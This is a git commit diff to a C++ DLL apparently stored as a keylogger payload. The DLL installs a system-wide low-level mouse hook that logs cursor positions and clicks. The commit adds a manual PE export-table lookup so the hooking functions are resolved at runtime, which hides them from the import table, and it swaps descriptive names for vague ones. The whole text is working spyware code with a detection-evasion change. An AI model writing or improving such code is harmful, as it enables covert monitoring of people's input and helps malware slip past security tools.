245b98aba31709cec56a11c7250ae9c5163926ed
Oorth <arthmaurya@gmail.com>
2025-01-31 11:25:23 +0530

    dynamically loaded the functions for mouse

--- test/payloads/keylogger/keylog_m_lib.cpp
+++ test/payloads/keylogger/keylog_m_lib.cpp
@@ -6,31 +6,70 @@
 #include <sstream>
 #define DLL_EXPORT __declspec(dllexport)
 ///////////////////////////////////////////////////////////////////////
-HHOOK mouseHook;
+HHOOK m_hook;
 std::vector<std::string>* sharedLogVector = nullptr;
 std::mutex logMutex;
 ///////////////////////////////////////////////////////////////////////
-LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam);
 ///////////////////////////////////////////////////////////////////////
+
+typedef HHOOK(WINAPI *SetWinHookFn)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL(WINAPI *UnhookWinHookExFn)(HHOOK);
+typedef LRESULT(WINAPI *CallNxtHookExFn)(HHOOK, int, WPARAM, LPARAM);
+
+SetWinHookFn MySetWindowsHookEx;
+UnhookWinHookExFn MyUnhookWindowsHookEx;
+CallNxtHookExFn MyCallNextHookEx;
+
+///////////////////////////////////////////////////////////////////////
+
+void* FindExportAddress(HMODULE hModule, const char* funcName)
+{
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
+
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
+    {
+        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
+        if (strcmp(funcNameFromExport, funcName) == 0)
+        {
+            DWORD funcRVA = funcRVAs[ordRVAs[i]];
+            return (void*)((BYTE*)hModule + funcRVA);
+
+        }
+    }
+    return nullptr;
+}
 
 DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
+
+    HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
+    MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
+    MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
+    MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
+    
     sharedLogVector = logVector;
-    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
+    m_hook = MySetWindowsHookEx(WH_MOUSE_LL, M_Proc, GetModuleHandle(NULL), 0);
 }
 
 DLL_EXPORT void Cleanup()
 {
-    if (mouseHook) UnhookWindowsHookEx(mouseHook);
+    if (m_hook) MyUnhookWindowsHookEx(m_hook);
 }
 
-LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0)
     {
-        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
-        int x = mouseStruct->pt.x;
-        int y = mouseStruct->pt.y;
+        MSLLHOOKSTRUCT* m_Struct = (MSLLHOOKSTRUCT*)lParam;
+        int x = m_Struct->pt.x;
+        int y = m_Struct->pt.y;
 
         switch (wParam)
         {
@@ -58,5 +97,5 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
             }
         }
     }
-    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
+    return MyCallNextHookEx(m_hook, nCode, wParam, lParam);
 }
